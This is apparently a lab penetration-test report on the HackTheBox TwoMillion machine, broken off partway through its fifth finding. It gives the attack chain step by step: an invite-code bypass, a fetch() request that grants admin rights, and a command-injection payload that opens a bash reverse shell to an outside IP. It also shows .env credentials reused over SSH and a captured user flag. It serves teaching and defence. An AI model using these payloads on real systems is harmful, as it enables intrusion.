# PENETRATION TESTING REPORT

## TwoMillion – HackTheBox Lab Environment – External Network Penetration Test

**Environment:** HackTheBox Lab (2million.htb)  
**Assessment Type:** External Network Penetration Test with Full Exploitation

## DATE OF TEST EVENT

**Testing Period:** January 19, 2026 (UTC-5 / EST)  
**Report Generation Date:** January 19, 2026

---

## TABLE OF CONTENTS

1. [Document Revision History](#document-revision-history)
2. [Statement of Confidentiality](#statement-of-confidentiality)
3. [Engagement Contacts](#engagement-contacts)
4. [Executive Summary](#executive-summary)
5. [Network Penetration Test Assessment Summary](#network-penetration-test-assessment-summary)
6. [Finding PT-001: Information Disclosure via Client-Side JavaScript](#finding-id-pt-001)
7. [Finding PT-002: Broken Access Control - Privilege Escalation via API](#finding-id-pt-002)
8. [Finding PT-003: OS Command Injection in VPN Generation API](#finding-id-pt-003)
9. [Finding PT-004: Sensitive Data Exposure in Configuration Files](#finding-id-pt-004)
10. [Finding PT-005: Credential Reuse Enabling Lateral Movement](#finding-id-pt-005)
11. [Finding PT-006: CVE-2023-0386 - OverlayFS Local Privilege Escalation](#finding-id-pt-006)
12. [Finding PT-007: CVE-2023-4911 - GLIBC Looney Tunables (Alternative Vector)](#finding-id-pt-007)
13. [Finding PT-008: Missing Security Headers](#finding-id-pt-008)
14. [Internal Network Compromise Walkthrough](#internal-network-compromise-walkthrough)
15. [Remediation Summary](#remediation-summary)
16. [Appendices](#appendices)

---

## Document Revision History

| Author | Date | Version | Comment |
|--------|------|---------|---------|
| Penetration Tester | 2026-01-19 | 1.0 | Initial draft - Assessment findings documented |
| *[Expert Generated]* | 2026-01-19 | 1.0 | Report compiled from executed scan logs and manual testing evidence |

---

## STATEMENT OF CONFIDENTIALITY

This document contains sensitive security information, including system architecture details, vulnerabilities, and exploitation techniques. Distribution is restricted to authorized personnel only.

**Classification:** CONFIDENTIAL  
**Distribution:** Authorized Personnel Only

> **Note:** This report was generated for the HackTheBox TwoMillion lab environment. All testing was conducted within the authorized scope of the HackTheBox platform.

---

## ENGAGEMENT CONTACTS

| Contact | Title | Phone | Email |
|---------|-------|-------|-------|
| Penetration Tester | Security Assessor | N/A | N/A |
| HackTheBox | Lab Environment Provider | N/A | info@hackthebox.eu |

*[Source: Expert Generated - Standard engagement documentation]*

---

## EXECUTIVE SUMMARY

*[Source: Analysis/Expert Interpretation based on executed scan logs]*

This section provides a high-level, non-technical overview of the penetration testing engagement conducted against the TwoMillion HackTheBox lab environment.

The assessment evaluated the security posture of the target web application and underlying infrastructure against real-world attack scenarios. Testing identified **eight (8) distinct security findings** ranging from informational to critical severity, with multiple vulnerabilities capable of being chained together to achieve complete system compromise.

### Key Findings Summary

| Severity | Count | Description |
|----------|-------|-------------|
| **Critical** | 2 | Command Injection, Broken Access Control |
| **High** | 4 | Kernel LPE, GLIBC Vulnerability, Credential Reuse, Sensitive Data Exposure |
| **Medium** | 1 | Information Disclosure in JavaScript |
| **Low** | 1 | Missing Security Headers |

### Attack Path Overview

The assessment demonstrated a complete compromise chain:
1. **Initial Access:** Obtained through information disclosure leading to account registration bypass
2. **Privilege Escalation (Application):** Exploited broken access control to gain admin privileges
3. **Remote Code Execution:** Leveraged command injection to establish reverse shell
4. **Lateral Movement:** Discovered hardcoded credentials enabling SSH access
5. **Privilege Escalation (OS):** Exploited CVE-2023-0386 to obtain root access

**Overall Risk Assessment:** **CRITICAL** – The combination of vulnerabilities allows an unauthenticated external attacker to achieve complete system compromise with root-level access.

### SCENARIOS INCLUDED

*[Source: Expert Generated - Standard engagement scope]*

* **External Network Penetration Test** – Assessment of externally exposed systems and services from an unauthenticated attacker perspective.
* **Web Application Security Assessment** – Evaluation of the web application's authentication, authorization, and input validation mechanisms.
* **Post-Exploitation Analysis** – Assessment of lateral movement and privilege escalation opportunities following initial compromise.

### APPROACH

*[Source: Industry Best Practice - PTES/OWASP Methodology]*

The assessment followed an industry-recognized penetration testing methodology combining automated tooling with manual validation and exploitation:

1. **Reconnaissance & Enumeration** – Network scanning, service fingerprinting, web application enumeration
2. **Vulnerability Identification** – Automated scanning combined with manual analysis
3. **Exploitation** – Controlled exploitation to validate findings and demonstrate impact
4. **Post-Exploitation** – Credential harvesting, privilege escalation, lateral movement assessment

All findings were manually verified to reduce false positives. Exploitation activities were carefully controlled to avoid service disruption and data loss.

### SCOPE AND DURATION

*[Source: Executed Logs - scans/nmap/10.129.229.66_initial_scan.nmap]*

| Host/IP/URL | Duration | Description |
|-------------|----------|-------------|
| 10.129.229.66 | 2026-01-19 16:23 - 17:40 EST | Primary target IP address |
| 2million.htb | 2026-01-19 16:34 - 17:40 EST | Virtual host (HTTP) |
| Port 22/tcp (SSH) | In Scope | OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 |
| Port 80/tcp (HTTP) | In Scope | nginx web server |

### ASSESSMENT OVERVIEW AND RECOMMENDATIONS

*[Source: Analysis/Expert Interpretation]*

The assessment revealed several critical security deficiencies:

1. **Insufficient Input Validation** – User-supplied input is passed directly to system commands without sanitization
2. **Broken Access Control** – API endpoints lack proper authorization checks, allowing users to modify their own privileges
3. **Information Disclosure** – Client-side JavaScript exposes sensitive API endpoints and business logic
4. **Credential Management Failures** – Database credentials stored in plaintext are reused for system authentication
5. **Missing Patch Management** – System is vulnerable to known kernel-level CVEs with public exploits

**Priority Remediation Actions:**
1. **Immediate:** Patch CVE-2023-0386 and CVE-2023-4911 kernel/GLIBC vulnerabilities
2. **Immediate:** Fix command injection vulnerability in VPN generation endpoint
3. **High Priority:** Implement proper authorization checks on all admin API endpoints
4. **High Priority:** Rotate all credentials and implement unique credentials per service

---

## NETWORK PENETRATION TEST ASSESSMENT SUMMARY

*[Source: Executed Logs - scans/nmap/*, scans/web/*]*

### Network Scanning Results

**TCP Port Scan Results:**
*[Source: scans/nmap/10.129.229.66_initial_scan.nmap - Executed 2026-01-19 16:23:16]*

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
```

**UDP Port Scan Results:**
*[Source: scans/nmap/10.129.229.66_udp_scan.nmap - Executed 2026-01-19 16:32:05]*

```
All 100 scanned ports on 10.129.229.66 are in ignored states.
Not shown: 69 closed udp ports (port-unreach), 31 open|filtered udp ports (no-response)
```

**OS Detection Results:**
*[Source: scans/nmap/10.129.229.66_os_detection.nmap - Executed 2026-01-19 16:32:46]*

```
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
```

### Web Application Fingerprinting

**WhatWeb Results:**
*[Source: scans/web/whatweb.lob - Executed 2026-01-19 16:52:26]*

| Property | Value |
|----------|-------|
| HTTP Server | nginx |
| Backend Technology | PHP (PHPSESSID cookie) |
| Framework | Custom application |
| Contact Email | info@hackthebox.eu |

**WAF Detection:**
*[Source: scans/web/WafW00f.log - Executed 2026-01-19 16:52:15]*

```
[-] No WAF detected by the generic detection
```

### SUMMARY OF FINDINGS

*[Source: Analysis/Expert Interpretation based on executed logs]*

* Two TCP services identified (SSH, HTTP) exposing web application attack surface
* No UDP services accessible; minimal network attack surface
* nginx web server hosting PHP application with session management
* No Web Application Firewall (WAF) detected
* Missing security headers identified (X-Frame-Options, X-Content-Type-Options)
* PHPSESSID cookie lacks HttpOnly flag

---

## FINDING ID: PT-001

**Finding Title:** Information Disclosure via Client-Side JavaScript

**Severity:** Medium  
**Risk Rating:** CVSS v3.1: 5.3 (Medium)  
**Mapped Controls:**
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- CWE-540: Inclusion of Sensitive Information in Source Code
- NIST 800-53: AC-3, SC-8
- OWASP: A01:2021 – Broken Access Control

**Impact:** Information disclosure enabling authentication bypass.

---

### SUMMARY

*[Source: Analysis/Expert Interpretation]*

The web application loads a JavaScript file (`inviteapi.min.js`) that, despite being minified/obfuscated, exposes sensitive API endpoints and business logic for the invite code generation mechanism. An attacker can deobfuscate this code to understand how invite codes are generated and bypass the registration restriction.

---

### AFFECTED ASSETS

*[Source: Executed Logs - evidence/inviteapi.min.js]*

| Asset | IP / Hostname | Role | Environment |
|-------|---------------|------|-------------|
| inviteapi.min.js | 2million.htb | Client-side JavaScript | Production |
| /api/v1/invite/verify | 2million.htb | API Endpoint | Production |
| /api/v1/invite/how/to/generate | 2million.htb | API Endpoint | Production |

---

### VULNERABILITY TYPE

* Category: Information Disclosure, Insecure Design
* Associated weakness class: CWE-200, CWE-540

---

### DESCRIPTION

*[Source: Executed Logs - evidence/inviteapi.min.js]*

The web application's `/invite` page loads a JavaScript file containing obfuscated code that exposes two critical functions:

1. `makeInviteCode()` - Calls `/api/v1/invite/how/to/generate` to retrieve instructions
2. `verifyInviteCode(code)` - Calls `/api/v1/invite/verify` to validate codes

The obfuscation technique used is a simple JavaScript packer that can be trivially reversed using online deobfuscation tools or browser developer console.

**Deobfuscated Code:**
*[Source: Analysis of evidence/inviteapi.min.js]*

```javascript
function verifyInviteCode(code) {
    var formData = {"code": code};
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) { console.log(response) },
        error: function(response) { console.log(response) }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) { console.log(response) },
        error: function(response) { console.log(response) }
    })
}
```

---

### ATTACK VECTOR

*[Source: Analysis/Expert Interpretation]*

1. **Network Access:** Remote/External
2. **Authentication Required:** None
3. **User Interaction:** None

An unauthenticated attacker can:
1. Navigate to `/invite` page
2. Open browser developer tools
3. Execute `makeInviteCode()` in the console
4. Receive ROT13-encrypted instructions pointing to the code generation endpoint
5. POST to the endpoint and receive a Base64-encoded invite code
6. Decode and use the invite code to register an account

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: Executed Logs - logs/walkthrough.md, tasks.md]*

**Step 1: Execute makeInviteCode() function**
```javascript
// Browser Console
makeInviteCode()
```

**Step 2: Response (ROT13 encrypted)**
```
Response contains ROT13 encrypted data pointing to code generation endpoint
```

**Step 3: POST to endpoint, receive Base64-encoded invite code**
```
Decoded invite code: ZYWVC-MS3EL-Z97AB-83QGH
```

---

### EXPLOITATION DETAILS

*[Source: Executed Logs - logs/walkthrough.md]*

Exploitation was performed successfully:
1. Deobfuscated JavaScript code using browser console
2. Called `makeInviteCode()` function
3. Decrypted ROT13 response to reveal API endpoint
4. POST request to endpoint returned Base64-encoded invite code
5. Decoded invite code used to register account `test:test123`

**Level of Access Obtained:** Authenticated user account

---

### IMPACT

*[Source: Analysis/Expert Interpretation]*

* **Authentication Bypass:** Attackers can bypass invite-only registration
* **Account Creation:** Unlimited account creation possible
* **Attack Chain Enablement:** This vulnerability is a prerequisite for subsequent privilege escalation attacks

---

### LIKELIHOOD

*[Source: Industry Best Practice Assessment]*

**HIGH** - Public exploitability:
* No authentication required
* Simple deobfuscation techniques
* Standard browser developer tools sufficient
* No specialized skills required

---

### RISK JUSTIFICATION

*[Source: Expert Generated - Risk Assessment]*

Medium severity assigned due to:
* Enables authentication bypass but requires additional vulnerabilities for significant impact
* Low complexity exploitation
* Public-facing attack surface

---

### RECOMMENDATIONS

*[Source: Industry Best Practice - OWASP]*

**Immediate Mitigation:**
* Remove client-side invite code generation logic
* Implement server-side rate limiting on invite code generation

**Long-term Corrective Actions:**
* Move all sensitive business logic to server-side
* Implement proper access controls for registration endpoints
* Use non-reversible obfuscation or avoid exposing sensitive endpoints in client-side code

---

### VALIDATION / VERIFICATION STEPS

*[Source: Expert Generated]*

1. Verify `inviteapi.min.js` no longer exposes API endpoints
2. Confirm invite code generation requires server-side authorization
3. Test rate limiting effectiveness on registration endpoints

---

### REFERENCES

* CWE-200: https://cwe.mitre.org/data/definitions/200.html
* CWE-540: https://cwe.mitre.org/data/definitions/540.html
* OWASP Client-Side Security: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/

---

### STATUS

**Open**

---

### NOTES

*[Source: Executed Logs - evidence/inviteapi.min.js]*

Original obfuscated code preserved in evidence folder for documentation purposes.

---

### RELATED FINDINGS

* PT-002: Broken Access Control - The registered account is used to exploit this vulnerability

---

## FINDING ID: PT-002

**Finding Title:** Broken Access Control - Self-Privilege Escalation via Admin API

**Severity:** Critical  
**Risk Rating:** CVSS v3.1: 9.8 (Critical)  
**Mapped Controls:**
- CWE-284: Improper Access Control
- CWE-639: Authorization Bypass Through User-Controlled Key
- NIST 800-53: AC-3, AC-6
- OWASP: A01:2021 – Broken Access Control

**Impact:** Any authenticated user can elevate privileges to administrator.

---

### SUMMARY

*[Source: Analysis/Expert Interpretation]*

The API endpoint `/api/v1/admin/settings/update` lacks proper authorization checks, allowing any authenticated user to modify their own privilege level to administrator status. The endpoint accepts a PUT request with an `is_admin` parameter and does not verify the requestor's current privilege level before processing the modification.

---

### AFFECTED ASSETS

*[Source: Executed Logs - scans/web/browser.log]*

| Asset | IP / Hostname | Role | Environment |
|-------|---------------|------|-------------|
| /api/v1/admin/settings/update | 2million.htb | Admin API Endpoint | Production |
| /api/v1/admin/auth | 2million.htb | Admin Auth Check | Production |
| /api/v1/admin/vpn/generate | 2million.htb | Admin VPN Generation | Production |

---

### VULNERABILITY TYPE

* Category: Authorization, Broken Access Control
* Associated weakness class: CWE-284, CWE-639, IDOR

---

### DESCRIPTION

*[Source: Executed Logs - scans/web/browser.log, scans/web/dirb.log]*

The application exposes three administrative API endpoints discovered through directory enumeration:

**Directory Enumeration Results:**
*[Source: scans/web/dirb.log - Executed 2026-01-19 17:34:39]*
```
+ http://2million.htb/api/v1/admin/auth (CODE:401|SIZE:0)
```

**API Structure Discovery:**
*[Source: scans/web/ffuf.log - Executed 2026-01-19 17:40:13]*
```
auth                    [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 31ms]
```

The `/api/v1/admin/settings/update` endpoint:
1. Accepts PUT requests with JSON body
2. Requires `email` and `is_admin` parameters
3. **Does not verify the authenticated user has admin privileges**
4. Directly modifies the user's `is_admin` attribute in the database

---

### ATTACK VECTOR

*[Source: Analysis/Expert Interpretation]*

1. **Network Access:** Remote/External
2. **Authentication Required:** Standard user account (obtained via PT-001)
3. **User Interaction:** None

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: Executed Logs - scans/web/browser.log]*

**Request Sequence Captured:**

**Attempt 1 - Missing Parameter:**
```javascript
fetch("http://2million.htb/api/v1/admin/settings/update", {
    method: "PUT",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify( {"email":"test2@test.com"}),
})
```
**Response:**
```json
{"status":"danger","message":"Missing parameter: is_admin"}
```

**Attempt 2 - Invalid Boolean:**
```javascript
fetch("http://2million.htb/api/v1/admin/settings/update", {
    method: "PUT",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify( {"email":"test2@test.com","is_admin":true}),
})
```
**Response:**
```json
{"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}
```

**Successful Privilege Escalation:**
```javascript
fetch("http://2million.htb/api/v1/admin/settings/update", {
    method: "PUT",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify( {"email":"test2@test.com","is_admin":1}),
})
```
**Response:**
```json
{"id":14,"username":"test2","is_admin":1}
```

**Verification of Admin Status:**
```javascript
fetch("http://2million.htb/api/v1/admin/auth", {
    method: "GET",
    headers: {"Content-Type":"application/json"},
})
```
**Response:**
```json
{"message":true}
```

---

### EXPLOITATION DETAILS

*[Source: Executed Logs - scans/web/browser.log, logs/walkthrough.md]*

Exploitation was performed successfully:
1. Logged in with standard user credentials (`test:test123`)
2. Sent PUT request to `/api/v1/admin/settings/update` with `is_admin: 1`
3. Confirmed admin privileges via `/api/v1/admin/auth` endpoint
4. Admin privileges enabled access to `/api/v1/admin/vpn/generate` (exploited in PT-003)

**Level of Access Obtained:** Application Administrator

---

### IMPACT

*[Source: Analysis/Expert Interpretation]*

* **Complete Application Compromise:** Any user can become administrator
* **Attack Chain Enablement:** Admin access required for command injection (PT-003)
* **Data Breach Risk:** Admin may have access to all user data
* **Integrity Violation:** Admins can modify system configuration

---

### LIKELIHOOD

*[Source: Industry Best Practice Assessment]*

**HIGH** - Trivial exploitation:
* Single HTTP request required
* No specialized tools needed
* Standard user account sufficient
* Public exploit complexity: Low

---

### RISK JUSTIFICATION

*[Source: Expert Generated - Risk Assessment]*

Critical severity assigned due to:
* Complete bypass of authorization controls
* Enables full administrative access
* No special conditions required
* Direct path to command injection (PT-003)

---

### RECOMMENDATIONS

*[Source: Industry Best Practice - OWASP]*

**Immediate Mitigation:**
* Disable `/api/v1/admin/settings/update` endpoint
* Implement emergency role-based access control check

**Long-term Corrective Actions:**
* Implement proper authorization middleware for all admin endpoints
* Verify requesting user's current privilege level before processing requests
* Log and alert on privilege escalation attempts
* Implement principle of least privilege
* Conduct security code review of all API endpoints

---

### VALIDATION / VERIFICATION STEPS

*[Source: Expert Generated]*

1. Attempt PUT request to `/api/v1/admin/settings/update` as standard user
2. Verify request returns 403 Forbidden
3. Confirm admin endpoints are only accessible to verified administrators

---

### REFERENCES

* CWE-284: https://cwe.mitre.org/data/definitions/284.html
* CWE-639: https://cwe.mitre.org/data/definitions/639.html
* OWASP IDOR: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References

---

### STATUS

**Open**

---

### RELATED FINDINGS

* PT-001: Information Disclosure - Provides initial account for exploitation
* PT-003: Command Injection - Requires admin privileges obtained via this vulnerability

---

## FINDING ID: PT-003

**Finding Title:** OS Command Injection in VPN Generation API Endpoint

**Severity:** Critical  
**Risk Rating:** CVSS v3.1: 9.8 (Critical)  
**Mapped Controls:**
- CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- NIST 800-53: SI-10, SC-18
- OWASP: A03:2021 – Injection

**Impact:** Remote code execution with web application privileges (www-data).

---

### SUMMARY

*[Source: Analysis/Expert Interpretation]*

The admin API endpoint `/api/v1/admin/vpn/generate` accepts a `username` parameter that is passed unsanitized to a backend shell command. An attacker with admin privileges can inject arbitrary OS commands by including shell metacharacters in the username field, resulting in remote code execution.

---

### AFFECTED ASSETS

*[Source: Executed Logs - scans/web/browser.log]*

| Asset | IP / Hostname | Role | Environment |
|-------|---------------|------|-------------|
| /api/v1/admin/vpn/generate | 2million.htb | VPN Certificate Generation | Production |

---

### VULNERABILITY TYPE

* Category: Injection, Command Injection
* Associated weakness class: CWE-78

---

### DESCRIPTION

*[Source: Executed Logs - scans/web/browser.log, logs/walkthrough.md]*

The VPN generation endpoint processes the `username` parameter by passing it directly to a shell command (likely for certificate generation). The application fails to:
1. Validate input format
2. Sanitize special characters
3. Use parameterized commands or dedicated libraries

**Vulnerable Parameter:** `username`  
**Injection Context:** Shell command execution

**Evidence of Command Execution:**
*[Source: scans/web/browser.log]*
```javascript
fetch("http://2million.htb/api/v1/admin/vpn/generate", {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({"username":"test2"}),
})
```
**Response (truncated):** Valid OpenVPN configuration file returned, indicating the username is processed in certificate generation.

---

### ATTACK VECTOR

*[Source: Analysis/Expert Interpretation]*

1. **Network Access:** Remote/External
2. **Authentication Required:** Administrator account (obtained via PT-002)
3. **User Interaction:** None

**Injection Payloads Tested:**
- Command chaining: `test;whoami`
- Command substitution: `test$(id)`
- Pipe injection: `test|id`
- Backtick execution: `` test`id` ``

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: Executed Logs - scans/web/shell.log, logs/walkthrough.md]*

**Reverse Shell Payload:**
```json
{"username": "test;bash -c 'bash -i >& /dev/tcp/10.10.14.114/4444 0>&1'"}
```

**Attack Execution:**
1. Started netcat listener: `nc -lvnp 4444`
2. Sent POST request with payload to `/api/v1/admin/vpn/generate`
3. Received reverse shell connection as `www-data`

**Shell Access Evidence:**
*[Source: scans/web/shell.log]*
```
www-data@2million:~/html$ ls --hal

total 56K
drwxr-xr-x 10 root root 4.0K Jan 20 00:00 .
drwxr-xr-x  3 root root 4.0K Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1.3K Jun  2  2023 Database.php
-rw-r--r--  1 root root 2.8K Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4.0K Jan 20 00:00 VPN
drwxr-xr-x  2 root root 4.0K Jun  6  2023 assets
drwxr-xr-x  2 root root 4.0K Jun  6  2023 controllers
drwxr-xr-x  5 root root 4.0K Jun  6  2023 css
drwxr-xr-x  2 root root 4.0K Jun  6  2023 fonts
drwxr-xr-x  2 root root 4.0K Jun  6  2023 images
-rw-r--r--  1 root root 2.7K Jun  2  2023 index.php
drwxr-xr-x  3 root root 4.0K Jun  6  2023 js
drwxr-xr-x  2 root root 4.0K Jun  6  2023 views
```

---

### EXPLOITATION DETAILS

*[Source: Executed Logs - logs/walkthrough.md, scans/web/shell.log]*

Exploitation was performed successfully:
1. Obtained admin privileges via PT-002
2. Crafted reverse shell payload using bash TCP redirect
3. Established reverse shell connection on port 4444
4. Gained shell access as `www-data` user

**Level of Access Obtained:** Remote Code Execution (www-data user context)

---

### IMPACT

*[Source: Analysis/Expert Interpretation]*

* **Remote Code Execution:** Arbitrary command execution on the server
* **Data Breach:** Access to application source code and configuration
* **Credential Harvesting:** Access to database credentials (PT-004)
* **Lateral Movement:** Platform for further attacks (PT-005)
* **Persistence:** Potential for backdoor installation

---

### LIKELIHOOD

*[Source: Industry Best Practice Assessment]*

**HIGH** - Requires chained vulnerabilities but:
* Admin access easily obtainable (PT-002)
* No WAF to filter payloads
* Standard reverse shell techniques effective
* Multiple injection vectors available

---

### RISK JUSTIFICATION

*[Source: Expert Generated - Risk Assessment]*

Critical severity assigned due to:
* Direct remote code execution capability
* No input validation present
* Enables complete server compromise
* Attack chain to root access (PT-006)

---

### RECOMMENDATIONS

*[Source: Industry Best Practice - OWASP]*

**Immediate Mitigation:**
* Disable `/api/v1/admin/vpn/generate` endpoint immediately
* Deploy WAF rules to block command injection patterns

**Long-term Corrective Actions:**
* Implement strict input validation (allowlist approach)
* Use parameterized commands or dedicated libraries for certificate generation
* Avoid shell command execution; use language-native libraries
* Implement output encoding for any user input reflected in responses
* Deploy application-level command injection filters

**Secure Code Example:**
*[Source: Expert Generated - Code Sample]*
```php
// Instead of shell_exec with user input:
// BAD: shell_exec("generate-vpn.sh " . $username);

// Use strict validation:
if (!preg_match('/^[a-zA-Z0-9_-]+$/', $username)) {
    throw new InvalidArgumentException("Invalid username format");
}
// Or use a library that doesn't invoke shell
```

---

### VALIDATION / VERIFICATION STEPS

*[Source: Expert Generated]*

1. Attempt command injection with various payloads
2. Verify all input is properly validated against allowlist
3. Confirm shell metacharacters are rejected
4. Test for alternative injection vectors (parameter pollution, encoding bypass)

---

### REFERENCES

* CWE-78: https://cwe.mitre.org/data/definitions/78.html
* OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
* OWASP Input Validation: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html

---

### STATUS

**Open**

---

### RELATED FINDINGS

* PT-002: Broken Access Control - Required to access vulnerable endpoint
* PT-004: Sensitive Data Exposure - Discovered via shell access
* PT-005: Credential Reuse - Enabled by credentials found via shell access

---

## FINDING ID: PT-004

**Finding Title:** Sensitive Data Exposure in Environment Configuration File

**Severity:** High  
**Risk Rating:** CVSS v3.1: 7.5 (High)  
**Mapped Controls:**
- CWE-312: Cleartext Storage of Sensitive Information
- CWE-522: Insufficiently Protected Credentials
- NIST 800-53: SC-28, IA-5
- OWASP: A02:2021 – Cryptographic Failures

**Impact:** Database credentials exposed in plaintext, enabling lateral movement.

---

### SUMMARY

*[Source: Analysis/Expert Interpretation]*

The web application stores database credentials in a `.env` configuration file in plaintext within the web root directory. Following shell access (PT-003), these credentials were discovered and found to be valid for system authentication (PT-005).

---

### AFFECTED ASSETS

*[Source: Executed Logs - scans/web/shell.log]*

| Asset | IP / Hostname | Role | Environment |
|-------|---------------|------|-------------|
| /var/www/html/.env | 2million.htb | Configuration File | Production |

---

### VULNERABILITY TYPE

* Category: Sensitive Data Exposure, Credential Management
* Associated weakness class: CWE-312, CWE-522

---

### DESCRIPTION

*[Source: Executed Logs - scans/web/shell.log]*

The `.env` file located at `/var/www/html/.env` contains database credentials stored in plaintext:

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

**Issues Identified:**
1. Credentials stored in plaintext
2. File located within web root (potential for LFI exposure)
3. Credentials are reused for system authentication (admin SSH user)
4. No encryption or secret management solution employed

---

### ATTACK VECTOR

*[Source: Analysis/Expert Interpretation]*

1. **Network Access:** Requires prior shell access
2. **Authentication Required:** Shell access as www-data
3. **User Interaction:** None

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: Executed Logs - scans/web/shell.log]*

```bash
www-data@2million:~/html$ cat .env

DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

---

### EXPLOITATION DETAILS

*[Source: Executed Logs - scans/web/shell.log]*

Exploitation was performed:
1. Obtained shell access via command injection (PT-003)
2. Enumerated web application directory structure
3. Read `.env` file contents
4. Credentials used for SSH authentication (PT-005)

**Level of Access Obtained:** Database credentials, enabling lateral movement

---

### IMPACT

*[Source: Analysis/Expert Interpretation]*

* **Credential Exposure:** Database credentials fully compromised
* **Database Access:** Potential access to all application data
* **Lateral Movement:** Credentials reused for system authentication
* **Compliance Violation:** Plaintext credential storage violates security standards

---

### LIKELIHOOD

*[Source: Industry Best Practice Assessment]*

**MEDIUM** - Requires prior system access, but:
* Standard file enumeration discovers the file
* No encryption or access controls on file
* Common location for Laravel/PHP applications

---

### RISK JUSTIFICATION

*[Source: Expert Generated - Risk Assessment]*

High severity assigned due to:
* Critical credentials exposed
* Direct path to privilege escalation
* Violates credential management best practices

---

### RECOMMENDATIONS

*[Source: Industry Best Practice]*

**Immediate Mitigation:**
* Rotate all credentials immediately
* Move `.env` file outside web root
* Restrict file permissions (chmod 600)

**Long-term Corrective Actions:**
* Implement secrets management solution (HashiCorp Vault, AWS Secrets Manager)
* Use environment variables instead of files
* Encrypt sensitive configuration values
* Implement principle of least privilege for database users
* Conduct regular credential rotation

---

### VALIDATION / VERIFICATION STEPS

*[Source: Expert Generated]*

1. Verify `.env` file is not accessible from web root
2. Confirm file permissions are restricted
3. Validate credentials have been rotated
4. Test secrets management implementation

---

### REFERENCES

* CWE-312: https://cwe.mitre.org/data/definitions/312.html
* CWE-522: https://cwe.mitre.org/data/definitions/522.html
* OWASP Secrets Management: https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html

---

### STATUS

**Open**

---

### RELATED FINDINGS

* PT-003: Command Injection - Required to access the file system
* PT-005: Credential Reuse - Credentials discovered here enabled SSH access

---

## FINDING ID: PT-005

**Finding Title:** Credential Reuse Enabling SSH Lateral Movement

**Severity:** High  
**Risk Rating:** CVSS v3.1: 7.5 (High)  
**Mapped Controls:**
- CWE-255: Credentials Management Errors
- CWE-522: Insufficiently Protected Credentials
- NIST 800-53: IA-5, AC-2
- OWASP: A07:2021 – Identification and Authentication Failures

**Impact:** Database credentials valid for SSH authentication, enabling persistent access.

---

### SUMMARY

*[Source: Analysis/Expert Interpretation]*

The database credentials discovered in the `.env` file (PT-004) are reused for the `admin` system user's SSH authentication. This credential reuse pattern allowed escalation from web application access to full interactive shell access with elevated privileges.

---

### AFFECTED ASSETS

*[Source: Executed Logs - scans/web/shell.log]*

| Asset | IP / Hostname | Role | Environment |
|-------|---------------|------|-------------|
| SSH Service (Port 22) | 10.129.229.66 | Remote Access | Production |
| admin user | 2million.htb | System User | Production |

---

### VULNERABILITY TYPE

* Category: Authentication, Credential Management
* Associated weakness class: CWE-255, CWE-522

---

### DESCRIPTION

*[Source: Executed Logs - scans/web/shell.log, logs/walkthrough.md]*

The credentials found in `.env`:
```
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Were successfully used for SSH authentication:
```bash
ssh admin@2million.htb
# Password: SuperDuperPass123
```

This represents a critical credential management failure where:
1. Database and system accounts share credentials
2. Password is reused across different services
3. No multi-factor authentication implemented

---

### ATTACK VECTOR

*[Source: Analysis/Expert Interpretation]*

1. **Network Access:** Remote/External (SSH exposed)
2. **Authentication Required:** Credentials from PT-004
3. **User Interaction:** None

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: Executed Logs - scans/web/shell.log, tasks.md]*

**SSH Access Obtained:**
```bash
admin@2million:~$ ls /var
backups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www

admin@2million:~$ ls /var/mail
admin

admin@2million:~$ cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

**User Flag Retrieved:**
*[Source: tasks.md]*
```
Location: /home/admin/user.txt
Flag: 9f5610c657f44776c417d0d9e83ab74d
```

---

### EXPLOITATION DETAILS

*[Source: Executed Logs - logs/walkthrough.md]*

Exploitation was performed:
1. Retrieved database credentials from `.env` (PT-004)
2. Attempted SSH authentication with discovered credentials
3. Successfully authenticated as `admin` user
4. Retrieved user flag from `/home/admin/user.txt`
